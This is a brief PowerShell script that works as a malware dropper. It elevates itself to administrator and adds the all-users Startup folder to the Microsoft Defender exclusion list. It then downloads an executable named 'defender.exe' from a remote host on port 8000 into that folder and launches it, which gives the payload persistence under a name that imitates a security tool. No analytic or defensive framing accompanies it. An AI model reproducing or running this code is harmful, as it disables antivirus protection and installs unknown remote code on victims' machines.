# variables
$Startupdir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
$WatsapURL = "http://retardgram.org:8000/defender.exe"
$WatsapPath = "$Startupdir\defender.exe"

# request admin rights
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
  $arguments = "& '" + $myinvocation.mycommand.definition + "'"
  Start-Process powershell -Verb runAs -ArgumentList $arguments
  Break
}

# force stop processes
Stop-Process -Name "defender" -Force -ErrorAction SilentlyContinue

# cleanup previous installation
Remove-Item -Path $WatsapPath -Force -ErrorAction SilentlyContinue

# add directory to defender exclusion list
Add-MpPreference -ExclusionPath $Startupdir

# download and execute
Invoke-WebRequest -Uri $WatsapURL -OutFile $WatsapPath
Start-Process $WatsapPath